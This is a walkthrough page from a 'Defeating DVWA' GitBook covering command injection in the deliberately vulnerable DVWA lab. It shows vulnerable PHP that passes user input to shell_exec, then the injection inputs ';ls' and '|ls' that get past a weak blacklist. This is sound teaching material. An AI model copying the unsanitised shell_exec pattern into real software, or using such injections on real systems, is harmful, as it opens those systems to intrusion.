@@ -1,0 +1,194 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+    <head prefix="og: http://ogp.me/ns# book: http://ogp.me/ns/book#">
+        
+        <meta charset="UTF-8">
+        <title>Command Execution | Defeating DVWA</title>
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="robots" content="index, follow">
+        <meta name="author" content="">
+        <meta name="description" content="*&quot;Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.&quot;*">
+        <meta name="keywords" content="gitbook,github" >
+        <meta name="generator" content="www.gitbook.io">
+
+        
+        
+        <link rel="prev" href="../brute_force/README.html" />
+        
+
+        <meta property="og:title" content="Command Execution | Defeating DVWA">
+        <meta property="og:site_name" content="Defeating DVWA">
+        <meta property="og:type" content="book">
+        <meta property="og:locale" content="en_US">
+
+        <meta property="book:author" content="https://github.com/">
+        <meta property="book:tag" content="GitBook">
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+        <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+        
+    </head>
+    <body>
+        
+        <link rel="stylesheet" href="../gitbook/style.css">
+        
+        
+    <div class="book"  data-level="2" data-basepath=".." data-revision="1399065652742">
+    <div class="book-header">
+    <!-- Actions Left -->
+    
+    <a href="#" class="btn pull-left toggle-summary"><i class="fa fa-align-justify"></i></a>
+    <a href="#" class="btn pull-left toggle-search"><i class="fa fa-search"></i></a>
+
+    <!-- Actions Right -->
+    <a href="#" target="_blank" class="btn pull-right" data-sharing="google-plus"><i class="fa fa-google-plus"></i></a>
+    <a href="#" target="_blank" class="btn pull-right" data-sharing="facebook"><i class="fa fa-facebook"></i></a>
+    <a href="#" target="_blank" class="btn pull-right" data-sharing="twitter"><i class="fa fa-twitter"></i></a>
+
+    
+
+    <!-- Title -->
+    <h1><a href="../" >Defeating DVWA</a></h1>
+</div>
+
+    <div class="book-summary">
+    <div class="book-search">
+        <input type="text" placeholder="Search" class="form-control" />
+    </div>
+    <ul class="summary">
+        
+        <li data-level="0" data-path="index.html">
+            <a href="../"><i class="fa fa-check"></i> Introduction</a>
+        </li>
+        
+            <li  data-level="1" data-path="brute_force/README.html">
+                
+                <a href="../brute_force/README.html">
+                    <i class="fa fa-check"></i> <b>1.</b> Brute Force
+                </a>
+                
+                
+            </li>
+        
+            <li  data-level="2" data-path="command_execution/README.html">
+                
+                <a href="../command_execution/README.html">
+                    <i class="fa fa-check"></i> <b>2.</b> Command Execution
+                </a>
+                
+                
+            </li>
+        
+    </ul>
+</div>
+
+    <div class="book-body">
+        <div class="body-inner">
+            <div class="page-wrapper" tabindex="-1">
+                <div class="book-progress">
+    <div class="bar">
+        <div class="inner" style="width: 100%;min-width: 50%;"></div>
+    </div>
+    <div class="chapters">
+    
+        <a href="../index.html" title="Introduction" class="chapter done new-chapter" data-progress="0" style="left: 0%;"></a>
+    
+        <a href="../brute_force/README.html" title="Brute Force" class="chapter done new-chapter" data-progress="1" style="left: 50%;"></a>
+    
+        <a href="../command_execution/README.html" title="Command Execution" class="chapter done new-chapter" data-progress="2" style="left: 100%;"></a>
+    
+    </div>
+</div>
+
+                <div class="page-inner">
+                
+                    <section class="normal" id="section-gitbook_3">
+                    
+                        <h1 id="command-execution">Command Execution</h1>
+<h2 id="low">Low</h2>
+<pre><code class="lang-php"><span class="hljs-preprocessor">&lt;?php</span>
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'submit'</span> ] ) ) {
+    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'ip'</span> ];
+
+    <span class="hljs-comment">// Determine OS and execute the ping command.</span>
+    <span class="hljs-keyword">if</span> (stristr(php_uname(<span class="hljs-string">'s'</span>), <span class="hljs-string">'Windows NT'</span>)) { 
+        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">'ping  '</span> . <span class="hljs-variable">$target</span> );
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;'</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">'&lt;/pre&gt;'</span>;
+    } <span class="hljs-keyword">else</span> { 
+        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">'ping  -c 3 '</span> . <span class="hljs-variable">$target</span> );
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;'</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">'&lt;/pre&gt;'</span>;   
+    } 
+}
+<span class="hljs-preprocessor">?&gt;</span>
+</code></pre>
+<p>This is fairly straight forward, and a classic example of unsanitised input being used in a sensitive context. The <code>$target</code> variable is taken straight from a request parameter, and inserted into a <code>shell_exec</code> command.</p>
+<p>Since there is no sanitisation to evade, we can just insert our payload.</p>
+<p><em>Input:</em></p>
+<pre><code>;ls
+</code></pre><p><em>Output:</em></p>
+<pre><code>help
+index.php
+source
+</code></pre><h2 id="medium">Medium</h2>
+<pre><code class="lang-php"><span class="hljs-preprocessor">&lt;?php</span>
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'submit'</span>] ) ) {
+    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'ip'</span> ];
+
+    <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span>
+    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(
+        <span class="hljs-string">'&amp;&amp;'</span> =&gt; <span class="hljs-string">''</span>,
+        <span class="hljs-string">';'</span> =&gt; <span class="hljs-string">''</span>,
+    );
+
+    <span class="hljs-variable">$target</span> = str_replace( array_keys( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );
+
+    <span class="hljs-comment">// Determine OS and execute the ping command.</span>
+    <span class="hljs-keyword">if</span> (stristr(php_uname(<span class="hljs-string">'s'</span>), <span class="hljs-string">'Windows NT'</span>)) { 
+        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">'ping  '</span> . <span class="hljs-variable">$target</span> );
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;'</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">'&lt;/pre&gt;'</span>;  
+    } <span class="hljs-keyword">else</span> { 
+        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">'ping  -c 3 '</span> . <span class="hljs-variable">$target</span> );
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;'</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">'&lt;/pre&gt;'</span>;  
+    }
+}
+<span class="hljs-preprocessor">?&gt;</span>
+</code></pre>
+<p>They&#39;ve wised up a little now, and will no longer allow us to use <code>&amp;&amp;</code> or <code>;</code> to separate commands. Howevever, we can still use <code>|</code> to get our command in! Ordinarily, this would take the output of <code>ping</code> and use it as the input of our command. Any command that does not take input this way will work fine.</p>
+<p><em>Input:</em></p>
+<pre><code>|ls
+</code></pre><p><em>Output:</em></p>
+<pre><code>help
+index.php
+source
+</code></pre><h2 id="high">High</h2>
+<p><em>My kung fu is weak...</em></p>
+
+                    
+                    </section>
+                
+                </div>
+            </div>
+        </div>
+
+        
+        <a href="../brute_force/README.html" class="navigation navigation-prev"><i class="fa fa-angle-left"></i></a>
+        
+        
+    </div>
+</div>
+
+        
+        <script type="text/javascript">(function(e,b){if(!b.__SV){var a,f,i,g;window.mixpanel=b;b._i=[];b.init=function(a,e,d){function f(b,h){var a=h.split(".");2==a.length&&(b=b[a[0]],h=a[1]);b[h]=function(){b.push([h].concat(Array.prototype.slice.call(arguments,0)))}}var c=b;"undefined"!==typeof d?c=b[d]=[]:d="mixpanel";c.people=c.people||[];c.toString=function(b){var a="mixpanel";"mixpanel"!==d&&(a+="."+d);b||(a+=" (stub)");return a};c.people.toString=function(){return c.toString(1)+".people (stub)"};i="disable track track_pageview track_links track_forms register register_once alias unregister identify name_tag set_config people.set people.set_once people.increment people.append people.track_charge people.clear_charges people.delete_user".split(" ");
+for(g=0;g<i.length;g++)f(c,i[g]);b._i.push([a,e,d])};b.__SV=1.2;a=e.createElement("script");a.type="text/javascript";a.async=!0;a.src=("https:"===e.location.protocol?"https:":"http:")+'//cdn.mxpnl.com/libs/mixpanel-2.2.min.js';f=e.getElementsByTagName("script")[0];f.parentNode.insertBefore(a,f)}})(document,window.mixpanel||[]);
+        </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.1.3/ace.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.1.3/mode-javascript.js"></script>
+        <script src="../gitbook/jsrepl/jsrepl.js" id="jsrepl-script"></script>
+        <script src="../gitbook/app.js"></script>
+        
+    </body>
+</html>
